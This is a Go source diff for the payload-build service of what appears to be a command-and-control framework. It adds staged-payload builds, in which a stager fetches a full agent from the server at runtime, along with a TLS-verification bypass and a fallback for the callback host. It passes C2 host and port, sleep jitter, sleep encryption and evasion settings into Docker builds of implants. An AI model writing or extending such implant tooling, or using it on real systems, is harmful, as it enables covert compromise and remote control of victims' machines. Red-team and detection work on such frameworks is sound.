@@ -32,16 +32,17 @@ type buildView struct {
 func (g *gateway) handleCreateBuild(w http.ResponseWriter, r *http.Request) {
 	var req struct {
 		Config struct {
-			CampaignID   string `json:"campaign_id"`
-			ListenerID   string `json:"listener_id"`
-			ProfileName  string `json:"profile_name"`
-			TargetOS     string `json:"target_os"`
-			TargetArch   string `json:"target_arch"`
-			SleepSeconds int      `json:"sleep_seconds"`
-			JitterPct    int      `json:"jitter_pct"`
-			Ephemeral    bool     `json:"ephemeral"`
-			SleepEncrypt bool     `json:"sleep_encrypt"`
-			Features     []string `json:"features"`
+			CampaignID    string   `json:"campaign_id"`
+			ListenerID    string   `json:"listener_id"`
+			ProfileName   string   `json:"profile_name"`
+			TargetOS      string   `json:"target_os"`
+			TargetArch    string   `json:"target_arch"`
+			SleepSeconds  int      `json:"sleep_seconds"`
+			JitterPct     int      `json:"jitter_pct"`
+			Ephemeral     bool     `json:"ephemeral"`
+			TLSSkipVerify bool     `json:"tls_skip_verify"`
+			SleepEncrypt  bool     `json:"sleep_encrypt"`
+			Features      []string `json:"features"`
 		} `json:"config"`
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
@@ -63,7 +64,11 @@ func (g *gateway) handleCreateBuild(w http.ResponseWriter, r *http.Request) {
 		cfg.TargetArch = "x64"
 	}
 
-	// Resolve listener host/port from DB
+	// Resolve listener host/port from DB.
+	// bind_host is the server-side listen address (often 0.0.0.0); agents need a
+	// routable callback address, so we fall back to host.docker.internal when the
+	// bind address is not specific. For cross-network testing, set a real hostname
+	// or IP in the listener's bind_host field.
 	listenerHost := "host.docker.internal"
 	listenerPort := 4443
 	if cfg.ListenerID != "" {
@@ -73,7 +78,9 @@ func (g *gateway) handleCreateBuild(w http.ResponseWriter, r *http.Request) {
 			`SELECT bind_host, bind_port FROM listeners WHERE id = $1`, cfg.ListenerID,
 		).Scan(&host, &port)
 		if err == nil {
-			listenerHost = host
+			if host != "" && host != "0.0.0.0" {
+				listenerHost = host
+			}
 			listenerPort = port
 		}
 	}
@@ -107,8 +114,8 @@ func (g *gateway) handleCreateBuild(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// Kick off the build in the background
-	go g.runBuild(b.ID, buildUUID, cfg.CampaignID, listenerHost, strconv.Itoa(listenerPort),
-		cfg.TargetOS, cfg.TargetArch, cfg.ProfileName, cfg.SleepSeconds, cfg.JitterPct, cfg.SleepEncrypt, cfg.Features)
+	go g.runBuild(b.ID, cfg.CampaignID, listenerHost, strconv.Itoa(listenerPort),
+		cfg.TargetOS, cfg.TargetArch, cfg.ProfileName, cfg.SleepSeconds, cfg.JitterPct, cfg.TLSSkipVerify, cfg.SleepEncrypt, cfg.Features)
 
 	writeJSON(w, http.StatusCreated, b)
 }
@@ -169,8 +176,8 @@ func (g *gateway) handleListBuilds(w http.ResponseWriter, r *http.Request) {
 }
 
 // runBuild executes the Docker build in a background goroutine and updates the build record.
-func (g *gateway) runBuild(buildID, buildUUID, campaignID, c2Host, c2Port,
-	targetOS, targetArch, profileName string, sleepSecs, jitterPct int, sleepEncrypt bool, features []string) {
+func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
+	targetOS, targetArch, profileName string, sleepSecs, jitterPct int, tlsSkipVerify, sleepEncrypt bool, features []string) {
 
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Minute)
 	defer cancel()
@@ -205,6 +212,11 @@ func (g *gateway) runBuild(buildID, buildUUID, campaignID, c2Host, c2Port,
 
 	imageTag := "dm-agent-build-" + buildID
 
+	tlsSkipVerifyStr := "false"
+	if tlsSkipVerify {
+		tlsSkipVerifyStr = "true"
+	}
+
 	sleepEncryptStr := "false"
 	if sleepEncrypt {
 		sleepEncryptStr = "true"
@@ -231,30 +243,68 @@ func (g *gateway) runBuild(buildID, buildUUID, campaignID, c2Host, c2Port,
 		}
 	}
 
-	buildArgs := []string{
-		"build",
-		"-f", "/workspace/deploy/docker/Dockerfile.agent",
-		"--build-arg", "DM_TARGET=" + cargoTarget,
-		"--build-arg", "DM_BIN=" + binName,
-		"--build-arg", "DM_C2_HOST=" + c2Host,
-		"--build-arg", "DM_C2_PORT=" + c2Port,
-		"--build-arg", "DM_C2_PATH_REG=" + regPath,
-		"--build-arg", "DM_C2_PATH_POLL=" + pollPath,
-		"--build-arg", "DM_SLEEP_SECS=" + strconv.Itoa(sleepSecs),
-		"--build-arg", "DM_JITTER_PCT=" + strconv.Itoa(jitterPct),
-		"--build-arg", "DM_BUILD_UUID=" + buildUUID,
-		"--build-arg", "DM_TLS_SKIP_VERIFY=false",
-		"--build-arg", "DM_NO_EVASION=false",
-		"--build-arg", "DM_UA=" + userAgent,
-		"--build-arg", "DM_SLEEP_ENCRYPT=" + sleepEncryptStr,
-		"--build-arg", "DM_FEATURES=" + featuresArg,
+	buildVolume := os.Getenv("DM_BUILD_VOLUME")
+	if buildVolume == "" {
+		buildVolume = "dungeonmaster_build_artifacts"
 	}
-	if campaignID != "" && campaignID != "00000000-0000-0000-0000-000000000000" {
-		buildArgs = append(buildArgs, "--build-arg", "DM_CAMPAIGN_ID="+campaignID)
+
+	contentType := "application/octet-stream"
+	if ext == ".exe" {
+		contentType = "application/vnd.microsoft.portable-executable"
 	}
-	buildArgs = append(buildArgs, "-t", imageTag, "/workspace")
+
+	// For staged-payload builds, build the companion full-agent payload FIRST.
+	// The stager bakes DM_BUILD_UUID=buildID and fetches /stage/{buildID} at runtime.
+	// The server serves the companion payload (no staged-payload feature) from that endpoint.
+	if strings.Contains(featuresArg, "staged-payload") {
+		payloadFeatures := removeFeature(featuresArg, "staged-payload")
+		payloadImageTag := "dm-payload-build-" + buildID
+
+		// Cargo always produces the binary named after the package (binName = "dm-agent.exe").
+		// DM_BIN must match the cargo output so the Dockerfile cp succeeds.
+		payloadArgs := makeAgentBuildArgs(payloadImageTag, cargoTarget, binName, c2Host, c2Port,
+			regPath, pollPath, sleepSecs, jitterPct, buildID, tlsSkipVerifyStr, userAgent,
+			sleepEncryptStr, payloadFeatures, campaignID)
+
+		payloadCmd := exec.CommandContext(ctx, "docker", payloadArgs...)
+		payloadCmd.Env = append(os.Environ(), "DOCKER_BUILDKIT=1")
+		payloadCmd.Stdout = os.Stdout
+		payloadCmd.Stderr = os.Stderr
+		if err := payloadCmd.Run(); err != nil {
+			g.log.Error("docker build payload failed", zap.String("build_id", buildID), zap.Error(err))
+			setBuildStatus("failed", "", "")
+			return
+		}
+
+		payloadOut := "/artifacts/" + buildID + "-payload" + ext
+		payloadExtract := exec.CommandContext(ctx,
+			"docker", "run", "--rm",
+			"-v", buildVolume+":/out",
+			payloadImageTag, "sh", "-c", "cp /"+binName+" /out/"+buildID+"-payload"+ext,
+		)
+		if err := payloadExtract.Run(); err != nil {
+			g.log.Error("docker extract payload failed", zap.String("build_id", buildID), zap.Error(err))
+			setBuildStatus("failed", "", "")
+			return
+		}
+
+		exec.Command("docker", "rmi", payloadImageTag).Run() //nolint
+
+		if _, err := storage.UploadFile(ctx, storage.BucketArtifacts, buildID+"-payload"+ext, payloadOut, contentType); err != nil {
+			g.log.Error("minio upload payload failed", zap.String("build_id", buildID), zap.Error(err))
+			setBuildStatus("failed", "", "")
+			return
+		}
+		os.Remove(payloadOut)
+		g.log.Info("payload companion ready", zap.String("build_id", buildID), zap.String("key", buildID+"-payload"+ext))
+	}
+
+	buildArgs := makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
+		regPath, pollPath, sleepSecs, jitterPct, buildID, tlsSkipVerifyStr, userAgent,
+		sleepEncryptStr, featuresArg, campaignID)
 
 	buildCmd := exec.CommandContext(ctx, "docker", buildArgs...)
+	buildCmd.Env = append(os.Environ(), "DOCKER_BUILDKIT=1")
 	buildCmd.Stdout = os.Stdout
 	buildCmd.Stderr = os.Stderr
 	if err := buildCmd.Run(); err != nil {
@@ -263,10 +313,6 @@ func (g *gateway) runBuild(buildID, buildUUID, campaignID, c2Host, c2Port,
 		return
 	}
 
-	buildVolume := os.Getenv("DM_BUILD_VOLUME")
-	if buildVolume == "" {
-		buildVolume = "dungeonmaster_build_artifacts"
-	}
 	outPath := "/artifacts/" + buildID + ext
 	extractCmd := exec.CommandContext(ctx,
 		"docker", "run", "--rm",
@@ -280,11 +326,6 @@ func (g *gateway) runBuild(buildID, buildUUID, campaignID, c2Host, c2Port,
 	}
 
 	exec.Command("docker", "rmi", imageTag).Run() //nolint
-
-	contentType := "application/octet-stream"
-	if ext == ".exe" {
-		contentType = "application/vnd.microsoft.portable-executable"
-	}
 
 	artifactURL, err := storage.UploadFile(ctx, storage.BucketArtifacts, buildID+ext, outPath, contentType)
 	if err != nil {
@@ -302,6 +343,46 @@ func (g *gateway) runBuild(buildID, buildUUID, campaignID, c2Host, c2Port,
 	g.log.Info("build complete", zap.String("build_id", buildID), zap.String("url", downloadURL))
 
 	os.Remove(outPath)
+}
+
+func makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
+	regPath, pollPath string, sleepSecs, jitterPct int,
+	buildID, tlsSkipVerify, userAgent, sleepEncrypt, features, campaignID string) []string {
+
+	args := []string{
+		"build",
+		"-f", "/workspace/deploy/docker/Dockerfile.agent",
+		"--build-arg", "DM_TARGET=" + cargoTarget,
+		"--build-arg", "DM_BIN=" + binName,
+		"--build-arg", "DM_C2_HOST=" + c2Host,
+		"--build-arg", "DM_C2_PORT=" + c2Port,
+		"--build-arg", "DM_C2_PATH_REG=" + regPath,
+		"--build-arg", "DM_C2_PATH_POLL=" + pollPath,
+		"--build-arg", "DM_SLEEP_SECS=" + strconv.Itoa(sleepSecs),
+		"--build-arg", "DM_JITTER_PCT=" + strconv.Itoa(jitterPct),
+		"--build-arg", "DM_BUILD_UUID=" + buildID,
+		"--build-arg", "DM_TLS_SKIP_VERIFY=" + tlsSkipVerify,
+		"--build-arg", "DM_NO_EVASION=false",
+		"--build-arg", "DM_UA=" + userAgent,
+		"--build-arg", "DM_SLEEP_ENCRYPT=" + sleepEncrypt,
+		"--build-arg", "DM_FEATURES=" + features,
+	}
+	if campaignID != "" && campaignID != "00000000-0000-0000-0000-000000000000" {
+		args = append(args, "--build-arg", "DM_CAMPAIGN_ID="+campaignID)
+	}
+	args = append(args, "-t", imageTag, "/workspace")
+	return args
+}
+
+func removeFeature(features, remove string) string {
+	parts := strings.Split(features, ",")
+	kept := parts[:0]
+	for _, p := range parts {
+		if p != remove {
+			kept = append(kept, p)
+		}
+	}
+	return strings.Join(kept, ",")
 }
 
 // resolveTarget maps UI target_os/target_arch to Cargo triple, binary name, and file extension.
